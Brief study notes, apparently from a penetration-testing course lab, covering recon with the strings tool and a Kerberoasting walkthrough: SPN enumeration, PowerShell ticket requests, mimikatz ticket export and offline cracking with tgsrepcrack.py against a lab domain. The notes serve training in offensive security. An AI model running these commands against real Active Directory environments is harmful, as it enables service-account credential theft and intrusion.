# Chapter 1  Scope and Recon

strings -n 8 for different encoding types -e l for little endian b for big endian

```
strings -n 8 -e b WidgetStatisticalWhitepaper.doc WidgetStatisticalAnalysis.xls WidgetStatisticalWhitepaper.pdf | grep '\\'
```




# Chapter 2




# Chapter 5

## Kerberoasting

`cscript.exe GetUserSPNs.vbs`
```
powershell.exe -command "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'svcsqlserver/dc01.sec560.local:1433'"
```

```
mimikatz.exe
mimikatz # kerberos::list /export
mimikatz # exit
```

Look for `rc4_hmac_nt`

Crack ticket with tgsrepcrack.py from TIM Medin github.com/nidem

```
python tgsrepcrack.py example.dict C:\Users\sec560\Desktop\1-40a10000-john.doe@svcsqlserver~dc01.sec560.local~1433-SEC560.LOCAL.kirbi
```
